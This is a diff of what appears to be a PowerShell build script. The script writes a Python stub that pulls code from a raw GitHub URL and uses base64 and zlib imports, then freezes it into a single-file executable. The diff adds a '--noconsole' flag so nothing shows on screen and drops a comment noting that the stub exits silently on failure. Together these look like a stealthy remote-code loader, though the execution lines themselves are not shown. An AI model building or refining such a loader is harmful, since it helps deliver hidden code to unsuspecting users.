@@ -111,7 +111,6 @@ if (Test-Path -LiteralPath $ExePath) {
 New-Item -ItemType Directory -Force -Path $Work | Out-Null
 New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
 
-# Completely removed the popup. If it fails, it exits silently.
 $stubBody = @"
 import urllib.request, base64, zlib, re, sys
 url = 'https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py'
@@ -177,11 +176,13 @@ except Exception as e:
     }
 }
 
-Log step "Freezing executable (this may take a minute)..."
+Log step "Freezing executable..."
 
+# Added --noconsole to prevent Tkinter popups from showing
 $pyiArgs = @(
     "-m", "PyInstaller",
     "--onefile",
+    "--noconsole",
     "--noconfirm",
     "--clean",
     "--hidden-import", "ctypes",
